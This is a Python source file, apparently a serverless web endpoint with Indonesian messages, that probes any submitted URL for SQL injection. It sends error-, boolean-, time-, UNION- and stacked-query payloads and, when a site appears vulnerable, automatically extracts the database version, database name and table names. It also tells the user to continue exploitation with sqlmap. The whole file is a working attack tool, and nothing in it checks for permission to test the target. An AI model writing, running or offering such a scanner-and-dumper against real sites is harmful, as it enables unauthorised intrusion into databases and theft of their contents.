#!/usr/bin/env python3
"""
/api/scan.py – Enhanced SQLi Scanner
Menampilkan:
1. Multiple payloads with detailed results
2. Complete test URLs
3. Automatic dumping (version, db, tables)
4. Detailed vulnerability information
"""
import urllib.parse, json, socket, ssl, re

TIMEOUT = 8
VERBOSE_DUMP = True

def send_get(url):
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = 443 if p.scheme == 'https' else 80
    path = p.path + ('?' + p.query if p.query else '')
    sock = socket.socket()
    sock.settimeout(TIMEOUT)
    if p.scheme == 'https':
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\nUser-Agent: SVRIOT/4.0\r\n\r\n"
    sock.send(req.encode())
    resp = sock.recv(8192).decode(errors='ignore')
    sock.close()
    return resp

def quick_dump(base, param, value):
    dumps = {}
    # Version detection with multiple techniques
    payloads = [
        f"{base}?{param}={value}' UNION SELECT 1,@@version,3-- -",
        f"{base}?{param}={value}' UNION SELECT 1,version(),3-- -",
        f"{base}?{param}={value}' UNION SELECT 1,dbms_version,3 FROM v$instance-- -"
    ]
    
    for p in payloads:
        res = send_get(p)
        ver = re.findall(r'([0-9]+\.[0-9]+\.[0-9]+)', res)
        if ver:
            dumps['version'] = {"payload": p, "result": ver[0]}
            break
    else:
        dumps['version'] = {"payload": payloads[0], "result": "N/A"}

    # Database name with multiple techniques
    payloads = [
        f"{base}?{param}={value}' UNION SELECT 1,database(),3-- -",
        f"{base}?{param}={value}' UNION SELECT 1,current_database(),3-- -",
        f"{base}?{param}={value}' UNION SELECT 1,global_name FROM global_name-- -"
    ]
    
    for p in payloads:
        res = send_get(p)
        db = re.findall(r'([A-Za-z0-9_-]+)</', res)
        if db:
            dumps['database'] = {"payload": p, "result": db[0]}
            break
    else:
        dumps['database'] = {"payload": payloads[0], "result": "N/A"}

    # Tables extraction
    payloads = [
        f"{base}?{param}={value}' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -",
        f"{base}?{param}={value}' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- -",
        f"{base}?{param}={value}' UNION SELECT 1,object_name,3 FROM all_objects WHERE object_type='TABLE'-- -"
    ]
    
    for p in payloads:
        res = send_get(p)
        tbl = re.findall(r'([A-Za-z0-9_,]+)</', res)
        if tbl:
            dumps['tables'] = {"payload": p, "result": tbl[0].split(',')}
            break
    else:
        dumps['tables'] = {"payload": payloads[0], "result": []}

    return dumps

def test_payloads(base, param, value):
    payloads = [
        {
            "name": "Error-based (Single Quote)",
            "payload": f"{base}?{param}={value}'-- -",
            "type": "error-based",
            "check": lambda r: any(k in r.lower() for k in ["mysql","syntax","warning","error"])
        },
        {
            "name": "Boolean-Based (AND 1=1)",
            "payload": f"{base}?{param}={value}' AND 1=1-- -",
            "type": "boolean",
            "check": lambda r: len(r)
        },
        {
            "name": "Time-Based (SLEEP)",
            "payload": f"{base}?{param}={value}' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
            "type": "time-based",
            "check": lambda r: "syntax" not in r.lower()
        },
        {
            "name": "UNION-Based (Simple)",
            "payload": f"{base}?{param}={value}' UNION SELECT 1,2,3-- -",
            "type": "union",
            "check": lambda r: any(str(i) in r for i in [1,2,3])
        },
        {
            "name": "Stacked Queries",
            "payload": f"{base}?{param}={value}'; SELECT 1-- -",
            "type": "stacked",
            "check": lambda r: "error" not in r.lower()
        }
    ]
    
    results = []
    for p in payloads:
        try:
            res = send_get(p["payload"])
            vulnerable = p["check"](res)
            results.append({
                "name": p["name"],
                "payload": p["payload"],
                "type": p["type"],
                "vulnerable": vulnerable,
                "response_snippet": res[:200] + "..." if len(res) > 200 else res
            })
        except:
            results.append({
                "name": p["name"],
                "payload": p["payload"],
                "type": p["type"],
                "vulnerable": False,
                "error": "Request failed"
            })
    
    return results

def scan(url):
    p = urllib.parse.urlparse(url)
    qs = dict(urllib.parse.parse_qsl(p.query))
    if not qs:
        return {"status":"error","detail":"URL harus punya query string"}
    
    base = url.split('?')[0]
    param, value = next(iter(qs.items()))
    
    # Test all payloads
    payload_results = test_payloads(base, param, value)
    vulnerable_payloads = [p for p in payload_results if p["vulnerable"]]
    
    if not vulnerable_payloads:
        return {
            "status": "safe",
            "detail": "Tidak ditemukan SQLi yang jelas",
            "payloads": payload_results,
            "tech_details": {
                "parameter": param,
                "dbms": "Unknown",
                "technique": "None detected"
            }
        }
    
    # Get most effective payload
    best_payload = vulnerable_payloads[0]
    tech_type = best_payload["type"]
    
    # Auto dumping for vulnerable sites
    dump_data = quick_dump(base, param, value) if VERBOSE_DUMP else {}
    
    return {
        "status": "vuln",
        "detail": f"Vulnerable to {tech_type} SQL injection",
        "payloads": payload_results,
        "tech_details": {
            "type": tech_type,
            "parameter": param,
            "dbms": dump_data.get('version', {}).get('result', 'Unknown'),
            "technique": best_payload["name"],
            "confidence": "High"
        },
        "auto_dump": dump_data,
        "next_steps": [
            "Gunakan sqlmap untuk eksploitasi lebih lanjut",
            f"Gunakan payload: {best_payload['payload']}",
            "Coba dump lebih banyak data dengan UNION SELECT"
        ]
    }

def handler(event, context=None):
    url = urllib.parse.parse_qs(event.get('queryString', '')).get('url', [''])[0]
    if not url:
        return {"statusCode": 400, "body": json.dumps({"status":"error","detail":"url param wajib"})}
    return {"statusCode": 200, "body": json.dumps(scan(url), indent=2)}
